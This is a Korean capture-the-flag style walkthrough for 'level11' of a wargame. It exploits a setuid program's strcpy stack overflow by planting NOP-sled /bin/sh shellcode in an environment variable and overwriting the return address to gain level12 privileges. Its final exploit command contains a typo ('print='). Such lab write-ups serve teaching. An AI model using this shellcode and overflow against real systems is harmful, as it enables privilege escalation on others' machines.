level11
===
1. 일단 힌트 파일을 열어본다. 그러면 힌트파일에 다음과 같이 적혀 있는 것을 확인할 수 있다. 
```c
#include<stdio.h>
#include<stdlib.h>

int main( int argc, char *argv[]){
    char str[256];

    setreuid(3092, 3092);
    strcpy(str, argv[1]);
    printf(str);
}
```
이 소스는 attackme의 소스파일인 것 같다. 

그리고 str의 크기를 256이라고 정해놓고, 한도없이 입력받을 수 있는 것을 보아 
이 문제는 bof문제이다!!

2. gdb attackme -> disas main (main함수의 어셈블리코드를 보기)를 통해
main함수의 명령어를 본다. 

명령어를 보다보면 __<main+3>sub $0x108,%esp__ 부분을 찾을 수 있다. 이것을 보면 
str의 256바이트와 dummy 8바이트가 저장되어있는 것을 알 수 있다.  (0x108==264)

여기서의 메모리 구조는 str+dummy+SFP+RET(256+8+4+4)이다.

3. shellcode환경변수를 만들어서 RET에 shellcode의 주소를 넣어 attackme를 실행할 때 인자로 넣어 level12의 권한을 취득할 것이다.

일단, 환경변수 SHELLCODE를 만든다.
```
export SHELLCODE=`python -c'print"\x90"*1000+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'`
```
그리고 다음은 SHELLCODE의 주소를 구하는 프로그램인 getenv.c의 소스다.
```c
#include<stdio.h>

int main(int argc, char *argv[]){
    printf("%p", getenv(argv[1]));
    return 0;
}
```
위의 프로그램을 이용하여 SHELLCODE의 주소를 구하면 다음과 같다.
                       __0xbffffb0a__

4. 이제 attackme를 공격해보자!

./attackme `python  -c'print="\x90"*268+"\x0a\xfb\xff\xbf"'`를 입력하고, id를 입력해보면 level12권한을 취득했음을 알 수 있다. 그리고 my-pass를 입력하면 level12의 password를 알 수 있다.